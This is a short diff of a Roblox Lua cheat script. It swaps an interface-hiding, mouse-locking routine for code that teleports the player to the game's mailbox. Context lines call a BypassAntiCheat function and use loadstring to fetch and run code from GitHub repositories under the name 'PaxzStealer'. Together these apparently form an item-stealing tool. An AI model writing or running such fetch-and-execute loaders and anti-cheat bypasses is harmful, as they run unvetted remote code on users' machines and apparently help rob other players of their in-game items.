@@ -4,16 +4,14 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/API/main/
 
 BypassAntiCheat()
 AreaTeleport("Shop")
-TeleportToMailbox()
-
-local UserInputService = game:GetService("UserInputService")
-UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
-
-for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
-    v:Destroy(1)
-    end
-
-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local rootPart = character:WaitForChild("HumanoidRootPart")
+local workspace = game:GetService("Workspace")
+local mailbox = workspace["__MAP"].Interactive.Mailbox.Pad
+local mailboxCFrame = mailbox.CFrame
+rootPart.CFrame = mailboxCFrame
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Loading%20screen"))()
 
